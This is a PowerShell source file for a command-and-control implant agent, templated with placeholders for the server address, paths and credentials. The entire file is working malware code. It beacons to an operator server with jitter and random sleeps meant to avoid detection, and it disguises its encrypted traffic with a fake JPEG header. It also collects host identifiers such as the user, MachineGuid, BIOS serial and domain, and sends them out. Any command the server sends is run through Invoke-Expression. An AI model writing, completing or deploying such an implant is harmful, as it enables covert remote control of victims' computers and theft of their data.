# Kinetic Compliance Matrix - OPSEC-Enhanced PowerShell Agent

# Set TLS 1.2 for compatibility
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

# Server details
$serverAddress = '{{SERVER_ADDRESS}}'

# Initial endpoint paths
$beaconPath = '{{BEACON_PATH}}'
$commandResultPath = '{{CMD_RESULT_PATH}}'

# Agent configuration
$beaconInterval = {{BEACON_INTERVAL}}  # Seconds
$jitterPercentage = {{JITTER_PERCENTAGE}}  # +/- percentage
$maxFailuresBeforeFallback = {{MAX_FAILURES}}
$maxBackoffTime = {{MAX_BACKOFF}}
$randomSleepEnabled = {{RANDOM_SLEEP_ENABLED}}  # Optional random sleep between operations
$maxSleepTime = {{MAX_SLEEP_TIME}}  # Maximum sleep time in seconds
$userAgent = "{{USER_AGENT}}"

# Authentication credentials (if configured)
$username = "{{USERNAME}}"
$password = "{{PASSWORD}}"
$useCredentials = ($username -ne "") -and ($password -ne "")

# Proxy configuration
$proxyEnabled = {{PROXY_ENABLED}}
$proxyType = "{{PROXY_TYPE}}"
$proxyServer = "{{PROXY_SERVER}}"
$proxyPort = "{{PROXY_PORT}}"

# Initialize encryption key as null - will be obtained from server
$global:encryptionKey = $null
$global:firstContact = $true  # Flag to track if this is the first contact
$global:systemInfoSent = $false  # Flag to track if system info has been sent
$global:clientID = $null  # Store client ID received from server (only used for first contact)

{{PATH_ROTATION_CODE}}

# Function to set up proxy configuration
function Initialize-ProxySettings {
    if (-not $proxyEnabled) {
        return $null
    }
    
    $proxy = $null
    
    try {
        # Use system proxy settings
        if ($proxyType -eq "system") {
            # Get default system proxy
            $proxy = [System.Net.WebRequest]::GetSystemWebProxy()
            
            # Check if we have a system proxy configured
            if ($proxy) {
                Write-Host "Using system proxy configuration"
                return $proxy
            } else {
                Write-Host "No system proxy configured, continuing without proxy"
                return $null
            }
        }
        
        # Use manual proxy settings
        if ($proxyServer -and $proxyPort) {
            $proxyUri = "http://$proxyServer`:$proxyPort"
            
            if ($proxyType -eq "http") {
                $proxy = New-Object System.Net.WebProxy($proxyUri, $true)
                Write-Host "Using HTTP proxy: $proxyUri"
            }
            elseif ($proxyType -eq "socks4" -or $proxyType -eq "socks5") {
                # Direct SOCKS support is limited in .NET
                # This sets the proxy as HTTP, but with SOCKS endpoint
                # A more complete implementation would use a SOCKS library
                $proxy = New-Object System.Net.WebProxy($proxyUri, $true)
                Write-Host "Using $proxyType proxy: $proxyUri (via HTTP proxy)"
            }
            
            # Add proxy credentials if configured
            if ($useCredentials) {
                $credentials = New-Object System.Net.NetworkCredential($username, $password)
                $proxy.Credentials = $credentials
                Write-Host "Proxy credentials configured"
            }
            
            return $proxy
        }
    }
    catch {
        Write-Host "Error configuring proxy: $_"
    }
    
    # Default return if no proxy configured
    return $null
}

# Initialize proxy settings
$global:proxyInstance = Initialize-ProxySettings

# Function to create a WebClient with proper settings
function New-ConfiguredWebClient {
    $webClient = New-Object System.Net.WebClient
    
    # Set User-Agent
    $webClient.Headers.Add("User-Agent", $userAgent)
    
    # Set proxy if enabled
    if ($proxyEnabled -and $global:proxyInstance) {
        $webClient.Proxy = $global:proxyInstance
    }
    
    # Add authentication credentials if configured
    if ($useCredentials) {
        $credentials = New-Object System.Net.NetworkCredential($username, $password)
        $webClient.Credentials = $credentials
    }
    
    return $webClient
}

# Function to encrypt data for C2 communication with binary JPEG header
function Encrypt-Data {
    param([string]$PlainText)
    
    # Check if we have an encryption key yet
    if ($null -eq $global:encryptionKey) {
        # Return plaintext if no encryption key available yet
        return $PlainText
    }
    
    # Convert to bytes
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($PlainText)
    
    # Generate random IV
    $iv = New-Object byte[] 16
    $rng = New-Object System.Security.Cryptography.RNGCryptoServiceProvider
    $rng.GetBytes($iv)
    
    # Add padding
    $blockSize = 16
    $paddingLength = $blockSize - ($bytes.Length % $blockSize)
    $paddedBytes = New-Object byte[] ($bytes.Length + $paddingLength)
    [Array]::Copy($bytes, $paddedBytes, $bytes.Length)
    
    # Fill padding bytes
    for ($i = $bytes.Length; $i -lt $paddedBytes.Length; $i++) {
        $paddedBytes[$i] = [byte]$paddingLength
    }
    
    # Encrypt
    $aes = New-Object System.Security.Cryptography.AesCryptoServiceProvider
    $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $aes.Padding = [System.Security.Cryptography.PaddingMode]::None
    $aes.Key = $global:encryptionKey
    $aes.IV = $iv
    
    $encryptor = $aes.CreateEncryptor()
    $encryptedBytes = $encryptor.TransformFinalBlock($paddedBytes, 0, $paddedBytes.Length)
    
    # Combine IV and encrypted bytes
    $result = New-Object byte[] ($iv.Length + $encryptedBytes.Length)
    [Array]::Copy($iv, 0, $result, 0, $iv.Length)
    [Array]::Copy($encryptedBytes, 0, $result, $iv.Length, $encryptedBytes.Length)
    
    # Add JPEG header bytes (0xFF, 0xD8, 0xFF) at binary level before base64 encoding
    $jpegHeader = [byte[]]@(0xFF, 0xD8, 0xFF)
    $withHeader = New-Object byte[] ($jpegHeader.Length + $result.Length)
    [Array]::Copy($jpegHeader, 0, $withHeader, 0, $jpegHeader.Length)
    [Array]::Copy($result, 0, $withHeader, $jpegHeader.Length, $result.Length)
    
    # Return Base64
    return [System.Convert]::ToBase64String($withHeader)
}

# Function to decrypt data from C2 communication
function Decrypt-Data {
    param([string]$EncryptedBase64)
    
    # Check if we have an encryption key yet
    if ($null -eq $global:encryptionKey) {
        # Return the data as-is if no encryption key available yet
        return $EncryptedBase64
    }
    
    try {
        # Decode base64
        $encryptedBytes = [System.Convert]::FromBase64String($EncryptedBase64)
        
        # Extract IV and ciphertext
        $iv = $encryptedBytes[0..15]
        $ciphertext = $encryptedBytes[16..($encryptedBytes.Length-1)]
        
        # Create AES decryptor
        $aes = New-Object System.Security.Cryptography.AesCryptoServiceProvider
        $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
        $aes.Padding = [System.Security.Cryptography.PaddingMode]::None
        $aes.Key = $global:encryptionKey
        $aes.IV = $iv
        
        # Decrypt
        $decryptor = $aes.CreateDecryptor()
        $decryptedBytes = $decryptor.TransformFinalBlock($ciphertext, 0, $ciphertext.Length)
        
        # Remove padding
        $paddingLength = $decryptedBytes[$decryptedBytes.Length-1]
        $unpaddedBytes = $decryptedBytes[0..($decryptedBytes.Length-$paddingLength-1)]
        
        # Convert to string
        return [System.Text.Encoding]::UTF8.GetString($unpaddedBytes)
    }
    catch {
        # If decryption fails, it could be an initial exchange or invalid data
        # Just return the original input
        return $EncryptedBase64
    }
}

# Function to handle key issuance or rotation
function Update-EncryptionKey {
    param([string]$Base64Key)
    
    try {
        # Convert the Base64 key to a byte array
        $newKey = [System.Convert]::FromBase64String($Base64Key)
        
        # Set the global encryption key
        $global:encryptionKey = $newKey
        
        # After receiving a key, we're no longer in first contact
        $global:firstContact = $false
        
        Write-Host "Encryption key updated successfully"
        return $true
    }
    catch {
        Write-Host "Error updating encryption key: $_"
        return $false
    }
}

# Function to gather system identification information
function Get-SystemIdentification {
    # Gather standard system information
    $systemInfo = @{
        Hostname = [System.Net.Dns]::GetHostName()
        IP = try {
            (Get-NetIPAddress -AddressFamily IPv4 | 
             Where-Object { $_.IPAddress -ne "127.0.0.1" } | 
             Select-Object -First 1).IPAddress
        } catch {
            "Unknown"
        }
    }
    
    # Add hardware identifiers to help server correlate clients
    $systemInfo.MacAddress = try {
        (Get-WmiObject Win32_NetworkAdapterConfiguration | 
         Where-Object { $_.IPEnabled -eq $true } | 
         Select-Object -First 1).MACAddress
    } catch {
        "Unknown"
    }
    
    # Add proxy information for diagnostics
    $systemInfo.ProxyEnabled = $proxyEnabled
    $systemInfo.ProxyType = $proxyType
    
    # Add OS info for better identification
    $systemInfo.OsVersion = [System.Environment]::OSVersion.VersionString
    $systemInfo.Username = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
    
    # Add rotation information if enabled
    if ($global:pathRotationEnabled) {
        $systemInfo.RotationId = $global:currentRotationId
    }
    
    # Try to get more detailed machine information
    try {
        # Add machine GUID if available (good for correlation)
        $machineGuid = Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Cryptography" -Name "MachineGuid" -ErrorAction SilentlyContinue
        if ($machineGuid) {
            $systemInfo.MachineGuid = $machineGuid.MachineGuid
        }
        
        # Add BIOS serial
        $bios = Get-WmiObject -Class Win32_BIOS -ErrorAction SilentlyContinue
        if ($bios) {
            $systemInfo.BiosSerial = $bios.SerialNumber
        }
        
        # Add processor ID
        $cpu = Get-WmiObject -Class Win32_Processor -ErrorAction SilentlyContinue | Select-Object -First 1
        if ($cpu) {
            $systemInfo.ProcessorId = $cpu.ProcessorId
        }
        
        # Add domain information
        $computerSystem = Get-WmiObject Win32_ComputerSystem -ErrorAction SilentlyContinue
        if ($computerSystem) {
            $systemInfo.Domain = $computerSystem.Domain
            $systemInfo.PartOfDomain = $computerSystem.PartOfDomain
        }
    }
    catch {
        # If detailed info collection fails, continue with basic info
        Write-Host "Warning: Could not collect some system details: $_"
    }
    
    # Convert to JSON
    $jsonInfo = ConvertTo-Json -InputObject $systemInfo -Compress
    return $jsonInfo
}

# Function to generate random padding data for token field
function Get-RandomToken {
    # Generate a totally random length between 50 and 500
    # Using Get-Random without the -SetSeed parameter for true randomness
    $rand = Get-Random -Minimum 50 -Maximum 500
    
    # Generate random alphanumeric string
    $chars = (65..90) + (97..122) + (48..57)  # A-Z, a-z, 0-9
    $padding = -join ((65..90)*2 + (97..122)*2 + (48..57)*1 | Get-Random -Count $rand | ForEach-Object {[char]$_})
    
    return $padding
}


# Function to process commands from the C2 server
function Process-Commands {
    param([array]$Commands)
    
    if (-not $Commands -or $Commands.Count -eq 0) {
        return
    }
    
    # Initialize tracking for processed command IDs if not exists
    if (-not (Get-Variable -Name processedCommandIds -Scope Global -ErrorAction SilentlyContinue)) {
        $global:processedCommandIds = @{}
    }
    
    # Process each command
    foreach ($command in $Commands) {
        $timestamp = $command.timestamp
        $commandType = $command.command_type
        $args = $command.args
        
        # Generate a unique command identifier
        $commandId = "$timestamp-$commandType"
        
        # Check if we've already processed this exact command
        if ($global:processedCommandIds.ContainsKey($commandId)) {
            Write-Host "Skipping duplicate command: $commandType at $timestamp (already processed)"
            continue
        }
        
        # Execute based on command type
        try {
            $result = ""
            
            # Handle key issuance and rotation commands first
            if ($commandType -eq "key_issuance") {
                # Initial key setup from server
                $success = Update-EncryptionKey -Base64Key $args
                $result = if ($success) { "Key issuance successful - secure channel established" } else { "Key issuance failed" }
                
                # Send the result back to C2 - this will be the first encrypted communication
                $resultObj = @{
                    timestamp = $timestamp
                    result = $result
                }
                
                # First prepare the JSON
                $resultJson = ConvertTo-Json -InputObject $resultObj -Compress
                
                # Create a web client for result submission
                $resultClient = New-ConfiguredWebClient
    
                # Try to send the result - with retry mechanism
                $maxRetries = 3
                $currentRetry = 0
                $sendSuccess = $false
                
                while (-not $sendSuccess -and $currentRetry -lt $maxRetries) {
                    try {
                        # Use the initial command result path
                        $resultUrl = "http://$serverAddress$commandResultPath"
                        Write-Host "Sending key issuance result to $resultUrl (attempt $($currentRetry+1))"
                        
                        # First try with unencrypted data
                        if ($currentRetry -eq 0) {
                            $resultClient.UploadString($resultUrl, $resultJson)
                        }
                        # On subsequent retries, try with encryption
                        else {
                            $encryptedResult = Encrypt-Data -PlainText $resultJson
                            $encryptedObj = @{
                                d = $encryptedResult  # Shortened from 'data'
                                t = Get-RandomToken    # Shortened from 'token'
                                c = $global:clientID   # Shortened from 'client_id', only for first contact
                            }
                            $encryptedJson = ConvertTo-Json -InputObject $encryptedObj -Compress
                            $resultClient.UploadString($resultUrl, $encryptedJson)
                        }
                        
                        $sendSuccess = $true
                        Write-Host "Key issuance result sent successfully"
                    }
                    catch {
                        $currentRetry++
                        Write-Host "Error sending key issuance result (attempt $currentRetry): $_"
                        Start-Sleep -Seconds 1  # Brief pause before retry
                    }
                }
                
                # Track this command as processed
                $global:processedCommandIds[$commandId] = $true
                
                # Continue to the next command
                continue
            }
            elseif ($commandType -eq "key_rotation") {
                # Handle key rotation command from operator
                $success = Update-EncryptionKey -Base64Key $args
                $result = if ($success) { "Key rotation successful - using new encryption key" } else { "Key rotation failed" }
            }
            elseif ($commandType -eq "system_info_request") {
                # Now that we have secure channel, send full system info
                $systemInfo = Get-SystemIdentification
                $result = $systemInfo
                $global:systemInfoSent = $true
                Write-Host "System information sent after secure channel established"
            }
            elseif ($commandType -eq "execute") {
                # Execute shell command
                try {
                    # Use PowerShell's Invoke-Expression to properly handle PowerShell commands
                    Write-Host "Executing command: $args"
                    $result = Invoke-Expression -Command $args | Out-String
                    Write-Host "Command execution completed"
                }
                catch {
                    $result = "Error executing command: $_"
                    Write-Host $result
                }
            }
            elseif ($commandType -eq "path_rotation") {
                # Handle path rotation command
                try {
                    $rotationArgs = ConvertFrom-Json -InputObject $args
                    $rotationId = $rotationArgs.rotation_id
                    $nextRotationTime = $rotationArgs.next_rotation_time
                    
                    # Create a new hashtable manually from the paths object
                    $newPaths = @{}
                    $rotationArgs.paths | Get-Member -MemberType NoteProperty | ForEach-Object {
                        $name = $_.Name
                        $value = $rotationArgs.paths.$name
                        $newPaths[$name] = $value
                    }
                    
                    # Now update with properly constructed hashtable
                    Update-PathRotation -RotationId $rotationId -NextRotationTime $nextRotationTime -Paths $newPaths
                    $result = "Path rotation updated: ID $rotationId, next rotation at $([DateTimeOffset]::FromUnixTimeSeconds($nextRotationTime).DateTime.ToString('yyyy-MM-dd HH:mm:ss'))"
                    Write-Host $result
                }
                catch {
                    $result = "Path rotation failed: $_"
                    Write-Host $result
                }
            }
            else {
                $result = "Unknown command type: $commandType"
            }
            
            # Send the result back to C2
            $resultObj = @{
                timestamp = $timestamp
                result = $result
            }
            
            $resultJson = ConvertTo-Json -InputObject $resultObj -Compress
            $encryptedResult = Encrypt-Data -PlainText $resultJson
            
            # Get current command result path
            $cmdResultPath = if ($global:pathRotationEnabled) { 
                $path = Get-CurrentPath -PathType "cmd_result_path"
                Write-Host "Using rotated command result path: $path"
                $path
            } else { 
                Write-Host "Using static command result path: $commandResultPath"
                $commandResultPath 
            }
            
            $resultUrl = "http://$serverAddress$cmdResultPath"
            
            $resultClient = New-ConfiguredWebClient
            
            # Create payload with encrypted data (JPEG header is now added inside Encrypt-Data)
            # Include random token field in the response
            $payload = @{
                d = $encryptedResult        # Shortened from 'data'
                t = Get-RandomToken         # Shortened from 'token'
            }
            
            # Add client ID only for first contact communication
            if ($global:firstContact) {
                $payload.c = $global:clientID  # Shortened from 'client_id'
            }
            
            $payloadJson = ConvertTo-Json -InputObject $payload -Compress
            
            Write-Host "Sending command result to $resultUrl"
            try {
                $resultClient.UploadString($resultUrl, $payloadJson)
                Write-Host "Command result sent successfully"
                
                # Track this command as processed
                $global:processedCommandIds[$commandId] = $true
            }
            catch {
                Write-Host "Error sending command result: $_"
            }
        }
        catch {
            # Send the error as a result
            $resultObj = @{
                timestamp = $timestamp
                result = "Error executing command: $_"
            }
            
            $resultJson = ConvertTo-Json -InputObject $resultObj -Compress
            $encryptedResult = Encrypt-Data -PlainText $resultJson
            
            # Get current command result path
            $cmdResultPath = if ($global:pathRotationEnabled) { Get-CurrentPath -PathType "cmd_result_path" } else { $commandResultPath }
            $resultUrl = "http://$serverAddress$cmdResultPath"
            
            $resultClient = New-ConfiguredWebClient
            
            # Create payload with encrypted data and random token
            $payload = @{
                d = $encryptedResult        # Shortened from 'data'
                t = Get-RandomToken         # Shortened from 'token'
            }
            
            # Add client ID only for first contact communication
            if ($global:firstContact) {
                $payload.c = $global:clientID  # Shortened from 'client_id'
            }
            
            $payloadJson = ConvertTo-Json -InputObject $payload -Compress
            
            Write-Host "Sending error result to $resultUrl"
            try {
                $resultClient.UploadString($resultUrl, $payloadJson)
                Write-Host "Error result sent successfully"
                
                # Track this command as processed even if it resulted in an error
                $global:processedCommandIds[$commandId] = $true
            }
            catch {
                Write-Host "Error sending command error result: $_"
            }
        }
    }
}

# Function to perform a GET beacon request
function Send-GetBeacon {
    param(
        [string]$Url,
        [string]$EncodedData,
        [string]$Token,
        [bool]$IsFirstContact = $false
    )
    
    try {
        # Create a query string with data and token (shortened field names)
        $queryString = "?d=$([System.Uri]::EscapeDataString($EncodedData))&t=$([System.Uri]::EscapeDataString($Token))"
        
        # Add first_contact flag if this is the first contact
        if ($IsFirstContact) {
            $queryString += "&i=true"  # Shortened from 'init'
        }
        
        # Include client ID in query string if this is first contact
        if ($IsFirstContact -and $global:clientID) {
            $queryString += "&c=$([System.Uri]::EscapeDataString($global:clientID))"  # Shortened from 'client_id'
        }
        
        $fullUrl = "$Url$queryString"
        
        # Create web client and set headers
        $webClient = New-ConfiguredWebClient
        
        # Download the response as a string
        Write-Host "Sending GET beacon to $fullUrl"
        $response = $webClient.DownloadString($fullUrl)
        return $response
    }
    catch {
        Write-Host "Error in GET beacon: $_"
        throw
    }
}

# Function to perform a POST beacon request
function Send-PostBeacon {
    param(
        [string]$Url,
        [string]$PayloadJson,
        [bool]$IsFirstContact = $false
    )
    
    try {
        # Create web client with proper configuration
        $webClient = New-ConfiguredWebClient
        
        # Add content type for JSON
        $webClient.Headers.Add("Content-Type", "application/json")
        
        # Send the POST request
        Write-Host "Sending POST beacon to $Url"
        $response = $webClient.UploadString($Url, "POST", $PayloadJson)
        return $response
    }
    catch {
        Write-Host "Error in POST beacon: $_"
        throw
    }
}

# Function to check rotation times
function Check-PathRotation {
    $currentTime = [int][double]::Parse((Get-Date -UFormat %s))
    
    # Check if we're past rotation time
    if ($global:pathRotationEnabled -and $currentTime -ge $global:nextRotationTime) {
        # We need to get rotations info from server ASAP
        # Will be handled on next beacon
        Write-Host "Rotation time reached, waiting for update from server..."
    }
}

# Function to handle server response data and update rotation info
function Process-ServerResponse {
    param($ResponseData)
    
    # Extract information from response
    $serverData = $ResponseData
    
    # Check for rotation information
    if ($global:pathRotationEnabled -and $serverData.r) {  # 'r' is shortened from 'rotation_info'
        $rotationId = $serverData.r.cid  # 'cid' is shortened from 'current_rotation_id'
        $nextRotation = $serverData.r.nrt  # 'nrt' is shortened from 'next_rotation_time'
        
        if ($rotationId -and [int]$rotationId -ne $global:currentRotationId) {
            # Server has newer rotation, we need to get paths
            Write-Host "Server has newer rotation ID: $rotationId (current: $global:currentRotationId)"
            $global:currentRotationId = [int]$rotationId
        }
        
        if ($nextRotation -and [int]$nextRotation -ne $global:nextRotationTime) {
            $global:nextRotationTime = [int]$nextRotation
            Write-Host "Next rotation time updated: $([DateTimeOffset]::FromUnixTimeSeconds($global:nextRotationTime).DateTime.ToString('yyyy-MM-dd HH:MM:ss'))"
        }
    }
    
    # Save client ID if provided by server (only during first contact)
    if ($serverData.c) {  # 'c' is shortened from 'client_id'
        $global:clientID = $serverData.c
        Write-Host "Received client ID from server: $global:clientID"
    }
    
    # Check for key operation status
    if ($serverData.f -eq $true) {  # 'f' is shortened from 'first_contact'
        Write-Host "First contact with server established - key exchange in progress"
    }
    
    if ($serverData.ki -eq $true) {  # 'ki' is shortened from 'key_issuance'
        Write-Host "Key issuance indicated in response"
    }
    
    if ($serverData.kr -eq $true) {  # 'kr' is shortened from 'key_rotation'
        Write-Host "Key rotation indicated in response"
    }
}

# Function to perform a random sleep within configured limits
function Start-RandomSleep {
    # Generate a random sleep time between 1 and maxSleepTime seconds
    if ($maxSleepTime -gt 1) {
        $sleepDuration = Get-Random -Minimum 1 -Maximum $maxSleepTime
        Write-Host "Performing random sleep for $sleepDuration seconds"
        Start-Sleep -Seconds $sleepDuration
        return $true
    }
    return $false
}

# Main agent loop
# Main agent loop
function Start-AgentLoop {
    # Track failed connection attempts for fallback
    $consecutiveFailures = 0
    
    # Boolean to track if we're using fallback paths
    $usingFallbackPaths = $false
    
    while ($true) {
        try {
            # Only perform random sleep if enabled (config controlled)
            if ($randomSleepEnabled) {
                # Randomly sleep before operations to further avoid detection
                Start-RandomSleep | Out-Null
            }
            
            # Check if rotation time has passed but we haven't got new paths yet
            Check-PathRotation
            
            # Add jitter to beacon interval
            $jitterFactor = 1 + (Get-Random -Minimum (-$jitterPercentage) -Maximum $jitterPercentage) / 100
            $actualInterval = $beaconInterval * $jitterFactor
            Write-Host "Using beacon interval: $actualInterval seconds (base: $beaconInterval, jitter: $jitterPercentage%)"
            
            # Get current beacon path based on rotation status
            $currentBeaconPath = if ($global:pathRotationEnabled -and -not $usingFallbackPaths) { 
                Write-Host "Using rotated path: $(Get-CurrentPath -PathType 'beacon_path')"
                Get-CurrentPath -PathType "beacon_path" 
            } else { 
                Write-Host "Using static path: $beaconPath"
                $beaconPath 
            }
            $beaconUrl = "http://$serverAddress$currentBeaconPath"
            
            # Generate random token for this request
            $randomToken = Get-RandomToken
            
            # For first contact, send minimal information to establish secure channel first
            if ($global:firstContact) {
                # For first contact, only send a dummy payload with token
                # We won't send any system information in the first contact
                $beaconPayload = @{
                    d = "{}"  # Empty JSON as placeholder, shortened from 'data'
                    f = $true  # Shortened from 'first_contact'
                    t = $randomToken  # Shortened from 'token'
                }
                
                # Add client ID if we have one from previous exchange
                if ($global:clientID) {
                    $beaconPayload.c = $global:clientID  # Shortened from 'client_id'
                }
                
                $beaconJson = ConvertTo-Json -InputObject $beaconPayload -Compress
                
                # Always use POST for first contact
                Write-Host "Sending first contact beacon to $beaconUrl"
                $response = Send-PostBeacon -Url $beaconUrl -PayloadJson $beaconJson -IsFirstContact $true
            }
            # For established contacts or after secure channel is established
            else {
                # Prepare the system info data - only after encryption is established
                $systemInfoRaw = Get-SystemIdentification
                
                # Established contact - encrypt data 
                $encryptedSystemInfo = Encrypt-Data -PlainText $systemInfoRaw
                $beaconPayload = @{
                    d = $encryptedSystemInfo  # Shortened from 'data'
                    t = $randomToken          # Shortened from 'token'
                }
                
                # Include rotation ID only if path rotation is enabled
                if ($global:pathRotationEnabled) {
                    $beaconPayload.r = $global:currentRotationId  # Shortened from 'rotation_id'
                }
                
                $beaconJson = ConvertTo-Json -InputObject $beaconPayload -Compress
                
                # Randomly decide between GET and POST for established connections
                $useGetMethod = ((Get-Random -Minimum 1 -Maximum 100) -le 50)
                
                # Beacon to the C2 server using either GET or POST
                $response = ""
                if ($useGetMethod) {
                    Write-Host "Sending GET beacon to $beaconUrl (established connection)"
                    $response = Send-GetBeacon -Url $beaconUrl -EncodedData $beaconPayload.d -Token $randomToken
                } else {
                    Write-Host "Sending POST beacon to $beaconUrl (established connection)"
                    $response = Send-PostBeacon -Url $beaconUrl -PayloadJson $beaconJson
                }
            }
            
            # Process response data
            $responseObject = ConvertFrom-Json -InputObject $response
            Process-ServerResponse -ResponseData $responseObject
            
            # Reset failure counter on successful connection
            $consecutiveFailures = 0
            $usingFallbackPaths = $false
            
            # Process response if it contains commands
            if ($responseObject.com -and ($responseObject.com.Length -gt 0 -or $responseObject.e -eq $true)) {  # 'com' is shortened from 'commands', 'e' from 'encrypted'
                # Check for special flag that indicates first contact/key issuance
                $isFirstContact = $responseObject.f -eq $true  # 'f' is shortened from 'first_contact'
                
                # If it's first contact, the commands are not encrypted
                if ($isFirstContact) {
                    # Process commands directly
                    Process-Commands -Commands $responseObject.com  # 'com' is shortened from 'commands'
                }
                else {
                    # For established sessions, decrypt the commands if they're encrypted
                    if ($responseObject.e -eq $true) {  # 'e' is shortened from 'encrypted'
                        $decryptedResponse = Decrypt-Data -EncryptedBase64 $responseObject.com
                        try {
                            $commands = ConvertFrom-Json -InputObject $decryptedResponse
                            Process-Commands -Commands $commands
                        }
                        catch {
                            Write-Host "Error parsing decrypted response: $_"
                        }
                    }
                    else {
                        # Handle unencrypted commands
                        Process-Commands -Commands $responseObject.com  # 'com' is shortened from 'commands'
                    }
                }
            }
        }
        catch {
            $errorMsg = $_.Exception.Message
            Write-Host "Error in beacon: $errorMsg"
            
            # Increment failure counter
            $consecutiveFailures++
            
            # If too many failures and using dynamic paths, try falling back to default paths
            if ($global:pathRotationEnabled -and $consecutiveFailures -ge $maxFailuresBeforeFallback -and -not $usingFallbackPaths) {
                Write-Host "Falling back to initial paths after $consecutiveFailures failures"
                $usingFallbackPaths = $true
            }
            
            # If still failing with fallback paths, increase the beacon interval temporarily
            if ($consecutiveFailures -gt ($maxFailuresBeforeFallback * 2)) {
                # Exponential backoff with max of the configured max backoff time
                $backoffSeconds = [Math]::Min([int]$maxBackoffTime, [Math]::Pow(2, ($consecutiveFailures - $maxFailuresBeforeFallback * 2) + 2))
                Write-Host "Connection issues persist, waiting $backoffSeconds seconds before retry"
                Start-Sleep -Seconds $backoffSeconds
                continue
            }
        }
        
        # Wait for next beacon interval
        Write-Host "Sleeping for $actualInterval seconds until next beacon"
        Start-Sleep -Seconds $actualInterval
    }
}

# Start the agent
Start-AgentLoop